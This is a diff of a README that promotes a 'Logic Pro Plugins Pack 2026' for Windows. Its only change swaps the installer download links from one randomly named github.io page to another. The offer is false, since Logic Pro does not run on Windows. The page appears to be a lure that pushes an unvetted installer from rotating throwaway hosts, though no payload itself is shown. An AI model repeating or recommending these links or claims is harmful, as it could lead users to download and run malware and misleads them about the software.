@@ -2,7 +2,7 @@
 
 Welcome to the **Logic Pro Plugins Pack 2026**, the ultimate toolkit for Windows users looking to expand their Logic Pro experience with a curated collection of plugins, templates, and tools. This package is designed to seamlessly integrate with Logic Pro, providing professional-grade enhancements for all your music projects. Whether you're a beginner or a seasoned producer, this pack offers everything you need to elevate your sound.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ This pack provides plugins and templates for educational and personal use. Ensur
 
 For the most recent version of the Logic Pro Plugins Pack 2026, please use the link below. This ensures you get all the latest features and security updates.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
